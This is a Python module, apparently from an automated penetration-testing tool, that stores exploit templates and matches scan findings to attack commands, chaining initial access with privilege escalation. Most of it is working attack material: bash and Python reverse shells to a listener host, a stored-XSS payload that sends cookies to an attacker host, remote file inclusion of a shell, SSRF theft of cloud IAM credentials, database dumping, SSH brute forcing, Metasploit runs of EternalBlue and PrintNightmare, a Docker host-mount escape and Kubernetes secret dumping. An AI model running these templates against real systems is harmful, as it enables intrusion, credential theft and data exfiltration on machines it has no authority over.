"""
Universal Exploit Templates Database

Comprehensive exploit templates for any penetration testing scenario.
Covers 40+ vulnerability types across all common technologies.
"""

from dataclasses import dataclass, field
from typing import Dict, List, Any, Optional
from enum import Enum
import re
import logging

logger = logging.getLogger(__name__)


class VulnCategory(Enum):
    WEB_INJECTION = "web_injection"
    WEB_AUTH = "web_auth"
    WEB_FILE = "web_file"
    WEB_SSRF = "web_ssrf"
    WEB_DESERIALIZE = "web_deserialize"
    NETWORK_SERVICE = "network_service"
    CMS = "cms"
    FRAMEWORK = "framework"
    DATABASE = "database"
    CONTAINER = "container"
    PRIVESC_LINUX = "privesc_linux"
    PRIVESC_WINDOWS = "privesc_windows"
    MISC = "misc"


class ExploitComplexity(Enum):
    TRIVIAL = "trivial"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    EXPERT = "expert"


@dataclass
class UniversalExploit:
    exploit_id: str
    name: str
    description: str
    category: VulnCategory
    complexity: ExploitComplexity
    vuln_patterns: List[str]
    service_patterns: List[str] = field(default_factory=list)
    port_patterns: List[int] = field(default_factory=list)
    tech_patterns: List[str] = field(default_factory=list)
    cve_patterns: List[str] = field(default_factory=list)
    tool: str = ""
    command_template: str = ""
    manual_steps: List[str] = field(default_factory=list)
    payloads: List[str] = field(default_factory=list)
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)
    reliability: float = 0.5
    stealth: float = 0.5
    requires_auth: bool = False
    references: List[str] = field(default_factory=list)
    
    def matches(self, finding: Dict) -> float:
        score = 0.0
        vuln_type = finding.get('type', '').lower()
        service = finding.get('service', '').lower()
        port = finding.get('port', 0)
        tech = finding.get('technology', '').lower()
        cve = finding.get('cve', '').upper()
        
        for pattern in self.vuln_patterns:
            if re.search(pattern, vuln_type, re.I):
                score += 0.4
                break
        for pattern in self.service_patterns:
            if re.search(pattern, service, re.I):
                score += 0.2
                break
        if port in self.port_patterns:
            score += 0.15
        for pattern in self.tech_patterns:
            if re.search(pattern, tech, re.I):
                score += 0.15
                break
        for pattern in self.cve_patterns:
            if re.search(pattern, cve, re.I):
                score += 0.3
                break
        return min(1.0, score)
    
    def build_command(self, ctx: Dict) -> str:
        if not self.command_template:
            return ""
        cmd = self.command_template
        replacements = {
            '{target}': ctx.get('target', ''),
            '{url}': ctx.get('url', ctx.get('target', '')),
            '{host}': ctx.get('host', ''),
            '{ip}': ctx.get('ip', ctx.get('host', '')),
            '{port}': str(ctx.get('port', 80)),
            '{lhost}': ctx.get('lhost', '10.10.14.1'),
            '{lport}': str(ctx.get('lport', 4444)),
            '{user}': ctx.get('username', 'admin'),
            '{pass}': ctx.get('password', ''),
            '{param}': ctx.get('parameter', 'id'),
            '{path}': ctx.get('path', '/'),
            '{wordlist}': ctx.get('wordlist', '/usr/share/wordlists/rockyou.txt'),
        }
        for k, v in replacements.items():
            cmd = cmd.replace(k, str(v))
        return cmd


UNIVERSAL_EXPLOITS = [
    # SQL Injection
    UniversalExploit("sqli_union", "SQL Injection - UNION Based", "UNION-based SQL injection",
        VulnCategory.WEB_INJECTION, ExploitComplexity.LOW,
        [r"sql.*inject", r"sqli", r"union.*inject"],
        tool="sqlmap",
        command_template="sqlmap -u '{url}' -p {param} --batch --dump --level=3 --risk=3",
        payloads=["' UNION SELECT NULL--", "' OR '1'='1"],
        success_indicators=["available databases", "dumped"],
        reliability=0.85),
    
    UniversalExploit("sqli_blind", "SQL Injection - Blind", "Boolean/Time-based blind SQLi",
        VulnCategory.WEB_INJECTION, ExploitComplexity.MEDIUM,
        [r"blind.*sql", r"boolean.*sql", r"time.*sql"],
        tool="sqlmap",
        command_template="sqlmap -u '{url}' -p {param} --batch --technique=BT --dump --level=5",
        payloads=["' AND 1=1--", "' AND SLEEP(5)--"],
        success_indicators=["injectable", "blind"],
        reliability=0.75),
    
    UniversalExploit("sqli_error", "SQL Injection - Error Based", "Error-based SQL injection",
        VulnCategory.WEB_INJECTION, ExploitComplexity.LOW,
        [r"error.*sql", r"sql.*error"],
        tool="sqlmap",
        command_template="sqlmap -u '{url}' -p {param} --batch --technique=E --dump",
        success_indicators=["error-based"],
        reliability=0.8),
    
    # Command Injection
    UniversalExploit("cmdi_basic", "Command Injection", "OS command injection",
        VulnCategory.WEB_INJECTION, ExploitComplexity.LOW,
        [r"command.*inject", r"os.*command", r"shell.*inject", r"rce"],
        tool="commix",
        command_template="commix -u '{url}' --batch --os-cmd='id'",
        payloads=["; id", "| id", "& id", "`id`", "$(id)"],
        success_indicators=["uid=", "gid="],
        reliability=0.8),
    
    UniversalExploit("rce_shell", "RCE - Reverse Shell", "Remote code execution with reverse shell",
        VulnCategory.WEB_INJECTION, ExploitComplexity.LOW,
        [r"rce", r"remote.*code", r"code.*execution"],
        tool="bash",
        command_template="bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        payloads=["bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                  "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"],
        success_indicators=["connection", "shell"],
        reliability=0.75),
    
    # XSS
    UniversalExploit("xss_reflected", "XSS - Reflected", "Reflected cross-site scripting",
        VulnCategory.WEB_INJECTION, ExploitComplexity.LOW,
        [r"xss", r"cross.*site.*script", r"reflected"],
        tool="xsstrike",
        command_template="xsstrike -u '{url}' --crawl",
        payloads=["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
        success_indicators=["vulnerable", "reflected"],
        reliability=0.8),
    
    UniversalExploit("xss_stored", "XSS - Stored", "Stored cross-site scripting",
        VulnCategory.WEB_INJECTION, ExploitComplexity.MEDIUM,
        [r"stored.*xss", r"persistent.*xss"],
        tool="xsstrike",
        command_template="xsstrike -u '{url}' --data 'comment={payload}'",
        payloads=["<script>document.location='http://{lhost}/?c='+document.cookie</script>"],
        success_indicators=["stored", "persistent"],
        reliability=0.75),
    
    # File Inclusion
    UniversalExploit("lfi_basic", "LFI - Local File Inclusion", "Local file inclusion",
        VulnCategory.WEB_FILE, ExploitComplexity.LOW,
        [r"lfi", r"local.*file.*incl", r"file.*read", r"path.*travers"],
        tool="curl",
        command_template="curl -s '{url}?{param}=../../../../../../../etc/passwd'",
        payloads=["../../../../../../etc/passwd", "php://filter/convert.base64-encode/resource=/etc/passwd"],
        success_indicators=["root:x:0", "bin/bash"],
        reliability=0.85),
    
    UniversalExploit("rfi", "RFI - Remote File Inclusion", "Remote file inclusion",
        VulnCategory.WEB_FILE, ExploitComplexity.MEDIUM,
        [r"rfi", r"remote.*file.*incl"],
        tool="curl",
        command_template="curl -s '{url}?{param}=http://{lhost}/shell.php'",
        payloads=["http://{lhost}/shell.php", "data://text/plain,<?php system('id'); ?>"],
        success_indicators=["uid="],
        reliability=0.7),
    
    # SSRF
    UniversalExploit("ssrf_basic", "SSRF", "Server-side request forgery",
        VulnCategory.WEB_SSRF, ExploitComplexity.MEDIUM,
        [r"ssrf", r"server.*side.*request"],
        tool="curl",
        command_template="curl -s '{url}?{param}=http://127.0.0.1/'",
        payloads=["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"],
        success_indicators=["internal", "metadata", "localhost"],
        reliability=0.75),
    
    UniversalExploit("ssrf_cloud", "SSRF - Cloud Metadata", "SSRF to cloud metadata",
        VulnCategory.WEB_SSRF, ExploitComplexity.MEDIUM,
        [r"ssrf.*cloud", r"ssrf.*aws", r"ssrf.*metadata"],
        tech_patterns=[r"aws", r"gcp", r"azure"],
        tool="curl",
        command_template="curl -s '{url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        payloads=["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/"],
        success_indicators=["AccessKeyId", "SecretAccessKey"],
        reliability=0.8),
    
    # Auth Bypass
    UniversalExploit("auth_bypass_sqli", "Auth Bypass - SQLi", "SQL injection auth bypass",
        VulnCategory.WEB_AUTH, ExploitComplexity.LOW,
        [r"auth.*bypass", r"login.*bypass"],
        tool="curl",
        command_template="curl -s -X POST '{url}' -d 'username=admin' --data-urlencode \"password=' OR '1'='1\"",
        payloads=["' OR '1'='1", "admin'--", "' OR 1=1#"],
        success_indicators=["welcome", "dashboard", "logged in"],
        reliability=0.8),
    
    UniversalExploit("default_creds", "Default Credentials", "Default credential testing",
        VulnCategory.WEB_AUTH, ExploitComplexity.TRIVIAL,
        [r"default.*cred", r"weak.*pass"],
        tool="hydra",
        command_template="hydra -l admin -P {wordlist} {host} http-post-form '{path}:username=^USER^&password=^PASS^:F=Invalid'",
        payloads=["admin:admin", "admin:password", "root:root"],
        success_indicators=["login successful"],
        reliability=0.6),
    
    # CMS Exploits
    UniversalExploit("wordpress_rce", "WordPress RCE", "WordPress plugin/theme RCE",
        VulnCategory.CMS, ExploitComplexity.MEDIUM,
        [r"wordpress.*rce", r"wp.*plugin"],
        tech_patterns=[r"wordpress", r"wp-"],
        tool="wpscan",
        command_template="wpscan --url {url} --enumerate ap,at,u --plugins-detection aggressive",
        success_indicators=["vulnerable", "CVE"],
        reliability=0.75),
    
    UniversalExploit("drupal_rce", "Drupal RCE", "Drupalgeddon exploits",
        VulnCategory.CMS, ExploitComplexity.LOW,
        [r"drupal", r"drupalgeddon"],
        cve_patterns=[r"CVE-2018-7600", r"CVE-2019-6340"],
        tech_patterns=[r"drupal"],
        tool="droopescan",
        command_template="droopescan scan drupal -u {url}",
        success_indicators=["vulnerable"],
        reliability=0.8),
    
    # Framework Exploits
    UniversalExploit("struts_rce", "Apache Struts RCE", "Struts OGNL injection",
        VulnCategory.FRAMEWORK, ExploitComplexity.LOW,
        [r"struts", r"ognl"],
        cve_patterns=[r"CVE-2017-5638", r"CVE-2018-11776"],
        tech_patterns=[r"struts", r"java"],
        tool="nuclei",
        command_template="nuclei -u {url} -t cves/2017/CVE-2017-5638.yaml",
        success_indicators=["vulnerable", "OGNL"],
        reliability=0.85),
    
    UniversalExploit("spring_rce", "Spring Framework RCE", "Spring4Shell",
        VulnCategory.FRAMEWORK, ExploitComplexity.MEDIUM,
        [r"spring", r"spring4shell"],
        cve_patterns=[r"CVE-2022-22965", r"CVE-2022-22963"],
        tech_patterns=[r"spring", r"java"],
        tool="nuclei",
        command_template="nuclei -u {url} -t cves/2022/CVE-2022-22965.yaml",
        success_indicators=["vulnerable"],
        reliability=0.8),
    
    UniversalExploit("log4shell", "Log4Shell", "Log4j RCE",
        VulnCategory.FRAMEWORK, ExploitComplexity.LOW,
        [r"log4j", r"log4shell", r"jndi"],
        cve_patterns=[r"CVE-2021-44228"],
        tech_patterns=[r"java", r"log4j"],
        tool="nuclei",
        command_template="nuclei -u {url} -t cves/2021/CVE-2021-44228.yaml",
        success_indicators=["vulnerable", "jndi"],
        reliability=0.9),
    
    # Network Services
    UniversalExploit("ssh_brute", "SSH Brute Force", "SSH credential brute forcing",
        VulnCategory.NETWORK_SERVICE, ExploitComplexity.LOW,
        [r"ssh.*weak", r"ssh.*brute"],
        service_patterns=[r"ssh"],
        port_patterns=[22, 2222],
        tool="hydra",
        command_template="hydra -l root -P {wordlist} ssh://{host} -t 4",
        success_indicators=["valid password"],
        reliability=0.5),
    
    UniversalExploit("ftp_anon", "FTP Anonymous", "FTP anonymous login",
        VulnCategory.NETWORK_SERVICE, ExploitComplexity.TRIVIAL,
        [r"ftp.*anon", r"anonymous.*ftp"],
        service_patterns=[r"ftp"],
        port_patterns=[21],
        tool="ftp",
        command_template="ftp -n {host} <<< $'user anonymous\\nls -la'",
        success_indicators=["230 Login successful"],
        reliability=0.9),
    
    UniversalExploit("smb_eternal", "SMB EternalBlue", "MS17-010 EternalBlue",
        VulnCategory.NETWORK_SERVICE, ExploitComplexity.LOW,
        [r"eternalblue", r"ms17.010", r"smb.*vuln"],
        cve_patterns=[r"CVE-2017-0144"],
        service_patterns=[r"smb", r"microsoft-ds"],
        port_patterns=[445, 139],
        tool="msfconsole",
        command_template="msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {host}; set LHOST {lhost}; run; exit'",
        success_indicators=["Meterpreter", "shell"],
        reliability=0.85),
    
    UniversalExploit("rdp_bluekeep", "RDP BlueKeep", "CVE-2019-0708 BlueKeep",
        VulnCategory.NETWORK_SERVICE, ExploitComplexity.HIGH,
        [r"bluekeep", r"rdp.*vuln"],
        cve_patterns=[r"CVE-2019-0708"],
        service_patterns=[r"rdp", r"ms-wbt-server"],
        port_patterns=[3389],
        tool="msfconsole",
        command_template="msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {host}; run; exit'",
        success_indicators=["shell"],
        reliability=0.6),
    
    # Database
    UniversalExploit("mysql_udf", "MySQL UDF", "MySQL UDF privilege escalation",
        VulnCategory.DATABASE, ExploitComplexity.MEDIUM,
        [r"mysql.*udf", r"mysql.*privesc"],
        service_patterns=[r"mysql", r"mariadb"],
        port_patterns=[3306],
        tool="mysql",
        command_template="mysql -h {host} -u {user} -p{pass} -e \"SELECT sys_exec('id');\"",
        success_indicators=["uid="],
        reliability=0.7,
        requires_auth=True),
    
    UniversalExploit("redis_rce", "Redis RCE", "Redis unauthorized RCE",
        VulnCategory.DATABASE, ExploitComplexity.MEDIUM,
        [r"redis.*rce", r"redis.*unauth"],
        service_patterns=[r"redis"],
        port_patterns=[6379],
        tool="redis-cli",
        command_template="redis-cli -h {host} CONFIG SET dir /var/www/html",
        success_indicators=["OK"],
        reliability=0.75),
    
    UniversalExploit("mongodb_unauth", "MongoDB Unauth", "MongoDB without authentication",
        VulnCategory.DATABASE, ExploitComplexity.TRIVIAL,
        [r"mongo.*unauth", r"mongodb.*open"],
        service_patterns=[r"mongodb"],
        port_patterns=[27017],
        tool="mongosh",
        command_template="mongosh --host {host} --eval 'db.adminCommand({listDatabases: 1})'",
        success_indicators=["databases", "ok"],
        reliability=0.9),
    
    # Linux Privesc
    UniversalExploit("linux_suid", "Linux SUID", "SUID binary exploitation",
        VulnCategory.PRIVESC_LINUX, ExploitComplexity.LOW,
        [r"suid", r"setuid"],
        tool="find",
        command_template="find / -perm -4000 -type f 2>/dev/null",
        manual_steps=["Find SUID binaries", "Check GTFOBins", "Execute privesc"],
        success_indicators=["root", "euid=0"],
        reliability=0.8),
    
    UniversalExploit("linux_sudo", "Linux Sudo", "Sudo misconfiguration",
        VulnCategory.PRIVESC_LINUX, ExploitComplexity.LOW,
        [r"sudo", r"sudoers"],
        tool="sudo",
        command_template="sudo -l",
        manual_steps=["Check sudo -l", "Find NOPASSWD entries", "Exploit via GTFOBins"],
        success_indicators=["NOPASSWD", "ALL"],
        reliability=0.75),
    
    UniversalExploit("linux_kernel", "Linux Kernel Exploit", "Kernel vulnerability",
        VulnCategory.PRIVESC_LINUX, ExploitComplexity.HIGH,
        [r"kernel.*exploit", r"dirty.*cow", r"dirty.*pipe"],
        cve_patterns=[r"CVE-2016-5195", r"CVE-2022-0847", r"CVE-2021-4034"],
        tool="linux-exploit-suggester",
        command_template="./linux-exploit-suggester.sh",
        success_indicators=["vulnerable"],
        reliability=0.6),
    
    UniversalExploit("pwnkit", "PwnKit", "Polkit pkexec CVE-2021-4034",
        VulnCategory.PRIVESC_LINUX, ExploitComplexity.LOW,
        [r"pwnkit", r"pkexec", r"polkit"],
        cve_patterns=[r"CVE-2021-4034"],
        tool="pwnkit",
        command_template="./PwnKit",
        success_indicators=["root", "uid=0"],
        reliability=0.85),
    
    # Windows Privesc
    UniversalExploit("windows_potato", "Windows Potato", "Token impersonation",
        VulnCategory.PRIVESC_WINDOWS, ExploitComplexity.MEDIUM,
        [r"potato", r"token.*imperson", r"seimpersonate"],
        tool="JuicyPotato",
        command_template="JuicyPotato.exe -l 1337 -p cmd.exe -a '/c whoami'",
        success_indicators=["SYSTEM"],
        reliability=0.8),
    
    UniversalExploit("windows_printspooler", "PrintNightmare", "Print Spooler RCE",
        VulnCategory.PRIVESC_WINDOWS, ExploitComplexity.MEDIUM,
        [r"printnight", r"print.*spooler"],
        cve_patterns=[r"CVE-2021-1675", r"CVE-2021-34527"],
        tool="msfconsole",
        command_template="msfconsole -q -x 'use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS {host}; run; exit'",
        success_indicators=["SYSTEM"],
        reliability=0.7),
    
    # Container
    UniversalExploit("docker_escape", "Docker Escape", "Container escape",
        VulnCategory.CONTAINER, ExploitComplexity.HIGH,
        [r"docker.*escape", r"container.*escape", r"privileged.*container"],
        tool="bash",
        command_template="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        manual_steps=["Check if in container", "Check for privileged mode", "Mount host filesystem"],
        success_indicators=["host filesystem", "escaped"],
        reliability=0.6),
    
    UniversalExploit("k8s_secrets", "Kubernetes Secrets", "K8s secrets extraction",
        VulnCategory.CONTAINER, ExploitComplexity.MEDIUM,
        [r"kubernetes", r"k8s.*secret"],
        tool="kubectl",
        command_template="kubectl get secrets --all-namespaces -o yaml",
        success_indicators=["data:", "Opaque"],
        reliability=0.7),
]


class UniversalExploitDatabase:
    """Database of universal exploit templates"""
    
    def __init__(self):
        self.exploits: Dict[str, UniversalExploit] = {}
        for exploit in UNIVERSAL_EXPLOITS:
            self.exploits[exploit.exploit_id] = exploit
        logger.info(f"[UniversalExploitDB] Loaded {len(self.exploits)} exploits")
    
    def get_by_id(self, exploit_id: str) -> Optional[UniversalExploit]:
        return self.exploits.get(exploit_id)
    
    def find_matching_exploits(self, finding: Dict, min_confidence: float = 0.3, max_results: int = 5) -> List[tuple]:
        matches = []
        for exploit in self.exploits.values():
            confidence = exploit.matches(finding)
            if confidence >= min_confidence:
                matches.append((exploit, confidence))
        matches.sort(key=lambda x: (x[1], x[0].reliability), reverse=True)
        return matches[:max_results]
    
    def get_by_category(self, category: VulnCategory) -> List[UniversalExploit]:
        return [e for e in self.exploits.values() if e.category == category]
    
    def get_by_cve(self, cve_id: str) -> List[UniversalExploit]:
        results = []
        cve_upper = cve_id.upper()
        for exploit in self.exploits.values():
            for pattern in exploit.cve_patterns:
                if re.search(pattern, cve_upper, re.I):
                    results.append(exploit)
                    break
        return results
    
    def get_by_service(self, service: str, port: int = None) -> List[UniversalExploit]:
        results = []
        for exploit in self.exploits.values():
            for pattern in exploit.service_patterns:
                if re.search(pattern, service, re.I):
                    results.append(exploit)
                    break
            if port and port in exploit.port_patterns and exploit not in results:
                results.append(exploit)
        return results
    
    def get_by_technology(self, technology: str) -> List[UniversalExploit]:
        results = []
        for exploit in self.exploits.values():
            for pattern in exploit.tech_patterns:
                if re.search(pattern, technology, re.I):
                    results.append(exploit)
                    break
        return results
    
    def search(self, query: str = None, category: VulnCategory = None, 
               complexity: ExploitComplexity = None, min_reliability: float = None) -> List[UniversalExploit]:
        results = list(self.exploits.values())
        if category:
            results = [e for e in results if e.category == category]
        if complexity:
            results = [e for e in results if e.complexity == complexity]
        if min_reliability:
            results = [e for e in results if e.reliability >= min_reliability]
        if query:
            q = query.lower()
            results = [e for e in results if q in e.name.lower() or q in e.description.lower()]
        return results
    
    def get_stats(self) -> Dict[str, Any]:
        exploits = list(self.exploits.values())
        return {
            "total": len(exploits),
            "by_category": {c.value: len([e for e in exploits if e.category == c]) for c in VulnCategory},
            "by_complexity": {c.value: len([e for e in exploits if e.complexity == c]) for c in ExploitComplexity},
            "avg_reliability": sum(e.reliability for e in exploits) / len(exploits) if exploits else 0,
            "with_cve": len([e for e in exploits if e.cve_patterns]),
        }
    
    def get_exploit_chain(self, findings: List[Dict], objective: str = "root") -> List[UniversalExploit]:
        chain = []
        initial_access = []
        for finding in findings:
            matches = self.find_matching_exploits(finding, min_confidence=0.4)
            for exploit, conf in matches:
                if exploit.category in [VulnCategory.WEB_INJECTION, VulnCategory.WEB_AUTH, VulnCategory.NETWORK_SERVICE]:
                    initial_access.append((exploit, conf))
        if initial_access:
            initial_access.sort(key=lambda x: (x[1], x[0].reliability), reverse=True)
            chain.append(initial_access[0][0])
        if objective in ["root", "system", "admin"]:
            is_windows = any("windows" in str(f).lower() for f in findings)
            privesc = self.get_by_category(VulnCategory.PRIVESC_WINDOWS if is_windows else VulnCategory.PRIVESC_LINUX)
            if privesc:
                privesc.sort(key=lambda x: x.reliability, reverse=True)
                chain.append(privesc[0])
        return chain


_universal_db: Optional[UniversalExploitDatabase] = None

def get_universal_exploit_db() -> UniversalExploitDatabase:
    global _universal_db
    if _universal_db is None:
        _universal_db = UniversalExploitDatabase()
    return _universal_db
